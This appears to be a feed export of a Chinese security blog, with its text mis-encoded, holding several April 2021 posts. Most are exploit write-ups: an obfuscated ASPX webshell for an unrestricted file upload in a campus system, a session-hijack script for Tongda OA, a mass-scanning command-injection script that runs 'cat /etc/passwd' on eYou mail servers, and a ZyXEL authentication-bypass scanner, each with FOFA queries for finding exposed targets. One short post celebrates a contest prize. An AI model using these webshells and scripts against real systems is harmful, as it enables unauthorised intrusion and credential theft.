      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·æ¯æŠ€èƒ½åœºæ™¯å†³èµ›</title>
      <link href="2021/04/17/happyhmgb/"/>
      <url>2021/04/17/happyhmgb/</url>
      
        <content type="html"><![CDATA[<p>æ‘¸é±¼é€‰æ‰‹æ‹¿äº†ä¸ªä¸‰ç­‰å¥–~å¥½è€¶ï¼ï¼ˆbieå¸¦æˆ‘é£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417615546.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104174777643.jpg"></p><p>æˆ‘ä»¬æ‹¿äº†å…¨åœºç¬¬ä¸€ä¸ªä¸€è¡€ï¼ï¼å˜¿å˜¿~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041741664553.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417417769475.jpg"></p><p>æ”¾æ³¢å›¾~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041756443.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417123456.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417542254542.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041714544288.jpg"></p><p>æœ€åæ¥å¼ çº¢è¡£æ•™ä¸»</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210417585465296.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çº¢æ˜è°·æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´-æ™ºæ…§æ ¡å›­ç³»ç»Ÿ</title>
      <link href="2021/04/15/Smartcampusfileupload/"/>
      <url>2021/04/15/Smartcampusfileupload/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸æ˜¯æ­£ä¹‰ä¼šèƒœåˆ©ï¼Œè€Œæ˜¯èƒœåˆ©çš„äººå³æ˜¯æ­£ä¹‰</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿå‰å°æ³¨å†Œé¡µé¢å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç”±äºæ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå®¡æŸ¥å¯¼è‡´å¯ä¸Šä¼ æ¶æ„æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨</p><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><p>è€è§„çŸ©ï¼Œfofaé‡‡é›†å·¥å…·ä¸Šå…ˆå¯¹å…¶æ”¶é›†ä¸€æ³¢</p><blockquote><p>fofaè¯­æ³•ï¼šbody=â€DC_Login/QYSignUpâ€</p></blockquote><p>æ‰¾åˆ°å…¶ä¸­ä¸€ä¸ªç–‘ä¼¼å¯åˆ©ç”¨çš„ç›®æ ‡ç«™ç‚¹ï¼ˆå¸¦æœ‰ä¼ä¸šç”¨æˆ·æ³¨å†ŒåŠŸèƒ½çš„ç«™ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041564196417.png"></p><p>ç‚¹å‡»ä¼ä¸šç”¨æˆ·æ³¨å†Œä¾¿å¯å‘ç°å¯å¯¹å…¶è¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104156529886.png"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸Šä¼ aspxğŸå¹¶ä¸”ä¸Šä¼ åå®ƒè¿˜èƒ½å›æ˜¾å¯¹åº”ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041569146361466.png"></p><h3 id="é™„ä¸ŠaspxğŸ"><a href="#é™„ä¸ŠaspxğŸ" class="headerlink" title="é™„ä¸ŠaspxğŸ"></a>é™„ä¸ŠaspxğŸ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var AUXR&#x3D;&#39;DQjiUYyXzAbVMPNsJLrlfRmughGESdKHkpawFTWICnBtoxeZqvOc&#39;;</span><br><span class="line">var OIWN&#x3D;Request.Form(&quot;PleasedaidaiHarvey&quot;);</span><br><span class="line">var JZLF&#x3D;AUXR(4) + AUXR(14) + AUXR(15) + AUXR(9) + AUXR(20) + AUXR(27);</span><br><span class="line">eval(OIWN, JZLF);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æœ€åèšå‰‘æˆåŠŸè¿ä¸Š</p><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202101154612641264.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´</title>
      <link href="2021/04/14/SSV-99140/"/>
      <url>2021/04/14/SSV-99140/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ‰æ—¶å€™ï¼Œå½“ä½ è¯´ä½ èµ¢äº†çš„æ—¶å€™ï¼Œä½ å°±å·²ç»è¾“äº†</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é€šè¾¾OA v11.7 ä¸­å­˜åœ¨æŸæ¥å£æŸ¥è¯¢åœ¨çº¿ç”¨æˆ·ï¼Œå½“ç”¨æˆ·åœ¨çº¿æ—¶ä¼šè¿”å› PHPSESSIONä½¿å…¶å¯ç™»å½•åå°ç³»ç»Ÿ</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>æ­¤pocæ¥æºäºç½‘ç»œï¼ˆé€šè¿‡éå†uidçš„å€¼ï¼Œåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸Šçº¿è¿‡ï¼Œå®ç°ä»»æ„ç”¨æˆ·ç™»å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        vuln_url = url + <span class="string">&quot;/mobile/auth_mobi.php?isAvatar=1&amp;uid=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;P_VER=0&quot;</span></span><br><span class="line">        resp = requests.get(vuln_url)</span><br><span class="line">        soup = BeautifulSoup(resp.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;RELOGIN&#x27;</span> <span class="keyword">in</span> soup.get_text():</span><br><span class="line">            print(<span class="string">&quot;ä¸å­˜åœ¨&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            PHPSESSION = re.findall(<span class="string">r&#x27;PHPSESSID=(.*?);&#x27;</span>, <span class="built_in">str</span>(resp.headers))</span><br><span class="line">            print(<span class="string">&#x27;uid=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;åœ¨çº¿&quot;</span>+<span class="string">&quot;å¯¹åº”çš„COOKIEå€¼æ˜¯ï¼šPHPSESSID=&quot;</span>+<span class="built_in">str</span>(PHPSESSION[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><blockquote><p>fofaè¯­æ³•ï¼šapp=â€TDXK-é€šè¾¾OAâ€</p></blockquote><p>â‘ .åˆ¤æ–­æ˜¯å¦ä¸ºåœ¨çº¿ç”¨æˆ·ï¼ˆæ‰¹é‡</p><p><a href="http://xxx.xx.xx.xx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0">http://xxx.xx.xx.xx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0</a></p><p>å¦‚æœé¡µé¢æ˜¯ç©ºç™½çš„å³ä¸ºç®¡ç†å‘˜åœ¨çº¿å¯åˆ©ç”¨ï¼›åä¹‹RELOGINå³ä¸ºä¸‹çº¿çŠ¶æ€æ— æ³•åˆ©ç”¨</p><p>â‘¡.è·å–å…¶cookie</p><p>â‘¢.æ­¤æ—¶è®¿é—® <a href="http://xxx.xx.xx.xx/general/">http://xxx.xx.xx.xx/general/</a> å³å¯ç™»å½•åå°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210414561249696.png"></p><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210414144213.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œæ¼æ´-äº¿é‚®é‚®ç®±ç³»ç»Ÿï¼ˆé«˜å±ï¼‰</title>
      <link href="2021/04/13/yiyouemail/"/>
      <url>2021/04/13/yiyouemail/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ‰€è°“è§„åˆ™ï¼Œè‡ªå¤ä»¥æ¥å°±æ˜¯èº«å¤„ç¥çš„ä½ç½®çš„äººå®šä¸‹çš„</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥æºï¼š<a href="https://mp.weixin.qq.com/s/KDlSyDn7DWwnnFeDednk8g">https://mp.weixin.qq.com/s/KDlSyDn7DWwnnFeDednk8g</a></p><h3 id="å®‰å…¨å…¬å‘Šç¼–å·-CNTA-2021-0012"><a href="#å®‰å…¨å…¬å‘Šç¼–å·-CNTA-2021-0012" class="headerlink" title="å®‰å…¨å…¬å‘Šç¼–å·:CNTA-2021-0012"></a><strong>å®‰å…¨å…¬å‘Šç¼–å·:CNTA-2021-0012</strong></h3><p>2021å¹´4æœˆ10æ—¥ï¼Œå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°ï¼ˆCNVDï¼‰æ”¶å½•äº†äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCNVD-2021-26422ï¼‰ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯åœ¨æœªæˆæƒçš„æƒ…å†µå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè·å–ç›®æ ‡æœåŠ¡å™¨æƒé™ã€‚ç›®å‰ï¼Œæ¼æ´åˆ©ç”¨ç»†èŠ‚å·²å…¬å¼€ï¼Œå‚å•†å·²äº4æœˆ9æ—¥å‘å¸ƒç‰ˆæœ¬è¡¥ä¸å®Œæˆä¿®å¤ã€‚</p><h3 id="ä¸€ã€æ¼æ´æƒ…å†µåˆ†æ"><a href="#ä¸€ã€æ¼æ´æƒ…å†µåˆ†æ" class="headerlink" title="ä¸€ã€æ¼æ´æƒ…å†µåˆ†æ"></a><strong>ä¸€ã€æ¼æ´æƒ…å†µåˆ†æ</strong></h3><p>äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿæ˜¯ç”±åŒ—äº¬äº¿ä¸­é‚®ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸ï¼ˆä»¥ä¸‹ç®€ç§°äº¿é‚®å…¬å¸ï¼‰å¼€å‘çš„ä¸€æ¬¾é¢å‘ä¸­å¤§å‹é›†å›¢ä¼ä¸šã€æ”¿åºœã€é«˜æ ¡ç”¨æˆ·çš„å›½äº§é‚®ä»¶ç³»ç»Ÿã€‚äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿé‡‡ç”¨äº†è‡ªä¸»ç ”å‘MTAå¼•æ“ã€åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå­˜å‚¨æ–¹å¼ã€å¤šå¯¹åˆ—æœºåˆ¶ã€ECSå­˜å‚¨å­ç³»ç»Ÿã€Cacheç³»ç»Ÿç­‰å¤šé¡¹æ ¸å¿ƒæŠ€æœ¯ï¼Œæä¾›äº†ä¸°å¯Œçš„é‚®ä»¶åŠŸèƒ½ã€‚</p><p>è¿‘æ—¥ï¼Œæœ‰å®‰å…¨äººå‘˜æŠ«éœ²äº†äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿé«˜å±æ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯é€šè¿‡ç²¾å¿ƒæ„é€ æ¶æ„è¯·æ±‚ï¼Œä½¿ç”¨POSTæ–¹æ³•åœ¨ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ï¼Œè·å–ç›®æ ‡æœåŠ¡å™¨æƒé™ï¼Œæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®å‰ï¼Œæ¼æ´ç»†èŠ‚å·²å…¬å¼€ï¼Œå‚å•†å·²å‘å¸ƒç‰ˆæœ¬è¡¥ä¸å®Œæˆä¿®å¤ã€‚</p><p>CNVDå¯¹è¯¥æ¼æ´çš„ç»¼åˆè¯„çº§ä¸ºâ€œé«˜å±â€ã€‚</p><h3 id="äºŒã€æ¼æ´å½±å“èŒƒå›´"><a href="#äºŒã€æ¼æ´å½±å“èŒƒå›´" class="headerlink" title="äºŒã€æ¼æ´å½±å“èŒƒå›´"></a><strong>äºŒã€æ¼æ´å½±å“èŒƒå›´</strong></h3><p>æ¼æ´å½±å“çš„äº§å“ç‰ˆæœ¬ä¸ºäº¿é‚®ç”µå­é‚®ä»¶ç³»ç»ŸV8.3-V8.13çš„éƒ¨åˆ†äºŒæ¬¡å¼€å‘ç‰ˆæœ¬ã€‚</p><p>äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿä¿¡åˆ›ç‰ˆæœ¬åŠV8.13ä»¥åç‰ˆæœ¬ä¸å—å½±å“ã€‚</p><h3 id="ä¸‰ã€æ¼æ´å¤„ç½®å»ºè®®"><a href="#ä¸‰ã€æ¼æ´å¤„ç½®å»ºè®®" class="headerlink" title="ä¸‰ã€æ¼æ´å¤„ç½®å»ºè®®"></a><strong>ä¸‰ã€æ¼æ´å¤„ç½®å»ºè®®</strong></h3><p>ç›®å‰ï¼Œäº¿é‚®å…¬å¸å·²é€šè¿‡æŠ€æœ¯æ”¯æŒæ¸ é“å‘ç”¨æˆ·æä¾›äº†è¡¥ä¸ç¨‹åºã€‚</p><p>CNVDå»ºè®®ä½¿ç”¨äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿçš„ç”¨æˆ·æŒ‰ç…§å¦‚ä¸‹æ–¹å¼è¿›è¡Œè‡ªæŸ¥ï¼Œå‘ç°å­˜åœ¨æ¼æ´åï¼ŒåŠæ—¶è”ç³»äº¿é‚®å…¬å¸è¿›è¡Œæ¼æ´ä¿®è¡¥ã€‚</p><p><em>åœ¨é‚®ä»¶ç³»ç»ŸæœåŠ¡å™¨ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</em></p><p>ls/usr/local/eyou/mail/lib/php/monitor (8.10.xåŠä»¥åç‰ˆæœ¬)</p><p>ls/usr/local/eyou/mail/app/lib/php/monitor (8.10.xåŠä»¥å‰ç‰ˆæœ¬)</p><p>å¦‚ä¸äº†è§£å…·ä½“ç‰ˆæœ¬å·ï¼Œä¸Šè¿°ä¸¤æ¡å‘½ä»¤å¯ä¸åˆ†ç‰ˆæœ¬éƒ½æ‰§è¡Œä¸€ä¸‹</p><p><em>å¦‚æ‰€æœ‰çš„éªŒè¯å‘½ä»¤éƒ½è¿”å›â€œNo such file or directoryâ€æˆ–â€œæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•â€åˆ™è¯æ˜ä¸å­˜åœ¨æ¼æ´ï¼Œåä¹‹åˆ™æ¼æ´å­˜åœ¨ã€‚</em></p><p>ä½¿ç”¨æ¶‰åŠç‰ˆæœ¬çš„ç”¨æˆ·å¯é€šè¿‡400æœåŠ¡ç”µè¯ï¼ˆ400-111-6088ï¼‰è”ç³»äº¿é‚®å…¬å¸å”®åæœåŠ¡ï¼Œäº¿é‚®å…¬å¸å”®åç»´æŠ¤äººå‘˜å¯æä¾›è¡¥ä¸åŒ…å®‰è£…å’¨è¯¢ã€è¿œç¨‹æŠ€æœ¯æ”¯æŒä»¥åŠä¸Šé—¨æœåŠ¡ã€‚</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">threads=[]</span><br><span class="line">url_file=<span class="built_in">input</span>(<span class="string">&quot;enter target file&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;yiyou_IP.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span>(<span class="params">target_url, result_q</span>):</span></span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/webadm/?q=moni_detail.do&amp;action=gragh&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&quot;type=&#x27;|cat /etc/passwd||&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        print(<span class="string">&quot;\033[32m[o] æ­£åœ¨è¯·æ±‚ &#123;&#125;//webadm/?q=moni_detail.do&amp;action=gragh \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[32m[o] ç›®æ ‡ &#123;&#125;å­˜åœ¨æ¼æ´ ,æˆåŠŸæ‰§è¡Œ cat /etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            print(target_url+<span class="string">&quot;\033[32m[o] å“åº”ä¸º:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m&quot;</span>, e)</span><br><span class="line"><span class="keyword">for</span> targets <span class="keyword">in</span> f.readlines():</span><br><span class="line">    targets=targets.strip()</span><br><span class="line">    t=threading.Thread(target=POC_1,args=(targets,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°è„šæœ¬ç”¨çš„å‘½ä»¤æ˜¯cat/etc/passwdï¼Œä½ ä¹Ÿå¯æ‰§è¡Œwhoamiç­‰å‘½ä»¤ï¼ˆå°±ç›¸å½“äºä½ æ‹¿åˆ°äº†æœåŠ¡å™¨çš„shelläº†å¯éšæ„æ‰§è¡ŒæœåŠ¡å™¨å‘½ä»¤</p><blockquote><p>fofaè¯­æ³•ï¼š body=â€œäº¿é‚®é‚®ä»¶ç³»ç»Ÿâ€</p></blockquote><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210413124532.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3297 ZyXEL NBG2105èº«ä»½éªŒè¯ç»•è¿‡</title>
      <link href="2021/04/12/CVE-2021-3297/"/>
      <url>2021/04/12/CVE-2021-3297/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æˆ–è®¸å­˜åœ¨æœ¬èº«å°±æ¯«æ— æ„ä¹‰å¯è¨€</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> åœ¨Zyxel NBG2105 V1.00ï¼ˆAAGU.2ï¼‰C0è®¾å¤‡ä¸Šï¼Œå°†ç™»å½•cookieè®¾ç½®ä¸º1å¯æä¾›ç®¡ç†å‘˜è®¿é—®æƒé™ã€‚</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;ZyXEL_url.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">threads=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">url,result_q</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=requests.get(url,timeout=<span class="number">5</span>)</span><br><span class="line">        html=result.text</span><br><span class="line">        status=result.status_code</span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">           print(url+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;å­˜åœ¨æ¼æ´&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           print(url+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;ä¸å­˜åœ¨æ¼æ´&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line=line.strip()</span><br><span class="line">    tar=line+<span class="string">&quot;/login_ok.htm&quot;</span></span><br><span class="line">    t=threading.Thread(target=thread,args=(tar,Queue()))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reads:</span><br><span class="line">    i.join()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ›´æ”¹ loginå‚æ•°å¯ç”¨å®ç°åå°ç™»å½•è¿›è€Œä¿®æ”¹å…¶é…ç½®</p><blockquote><p>fofaè¯­æ³•ï¼šapp=â€ZyXEL-NBG2105â€</p></blockquote><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041256225858529.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-25078 D-Link DCSç³»åˆ—ç›‘æ§</title>
      <link href="2021/04/11/CVE-2020-25078/"/>
      <url>2021/04/11/CVE-2020-25078/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç›¸ä¿¡åœ¨ä¸ä¹…çš„å°†æ¥åªæœ‰ä¸¤ç§äººæ‹¥æœ‰è‡ªç”±ï¼Œä¸€ç§æ˜¯å½»åº•æŠ›å¼ƒäº†ä¿¡æ¯æ—¶ä»£çš„äººï¼Œä¸€ç§å°±æ˜¯é»‘å®¢ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨1.06.01 Hotfixä¹‹å‰çš„D-Link DCS-2530Lå’Œé€šè¿‡2.02è®¾å¤‡çš„DCS-2670Lä¸Šå‘ç°äº†ä¸€ä¸ªé—®é¢˜ã€‚æœªç»èº«ä»½éªŒè¯çš„/ config / getuserç«¯ç‚¹å…è®¸è¿œç¨‹ç®¡ç†å‘˜å¯†ç æ³„éœ²ã€‚</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span 